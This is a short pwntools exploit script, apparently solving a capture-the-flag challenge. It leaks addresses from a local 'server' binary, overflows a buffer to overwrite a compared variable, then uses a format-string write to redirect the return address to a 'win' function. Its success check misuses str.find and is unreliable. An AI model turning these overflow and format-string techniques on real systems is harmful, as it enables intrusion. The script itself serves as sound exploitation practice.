from pwn import *

# context.arch = "amd64"
# context.os = "linux"
# context.endian = "little"
# context.word_size = 64
# when not running on a remote server, its recommended to
context.binary = "./server"

bin = ELF("./server")
srv = process("./server")

stdout = srv.recvline()
print(">" + " &buff1 = " + stdout.decode().split()[-1])
buff1 = int(stdout.decode().split()[-1], 16)

stdout = srv.recvline()
print(">" + " &b = " + stdout.decode().split()[1])
b = int(stdout.decode().split()[1], 16)

offset = abs(buff1 - b)
print("The offset is:", hex(offset), "|", offset)

main_function = bin.symbols["main"]
disasm = bin.disasm(main_function, 600)
cmp_instructions = [line for line in disasm.split("\n") if "cmp" in line]
print(cmp_instructions)
overwrite_value = int(cmp_instructions[0].split(",")[1].split()[0], 16)
print("Overwrite to:", overwrite_value)

payload = b"=" * offset + p32(overwrite_value)
srv.sendline(payload)
stdout = srv.recvuntil(b":") + b" "
print(stdout.decode() + payload.decode())

stdout = srv.recvline()
print(stdout.decode())

if not stdout.decode().find("{}".format(overwrite_value)):
    print("Unsuccessful payload to overwrite value of b to", overwrite_value)
    exit()
else:
    print("Successful buffer overflow")

stdout = srv.recvline()
print(stdout.decode())

rip_addr = buff1 + 8
win = bin.symbols["win"]


def send_payload(payload):
    log.info("payload = %s" % repr(payload))
    srv.sendline(payload)
    return srv.recv()


format_string = FmtStr(send_payload)
format_string.write(rip_addr, win)
format_string.execute_writes()

stdout = srv.recvall()
print(stdout.decode())
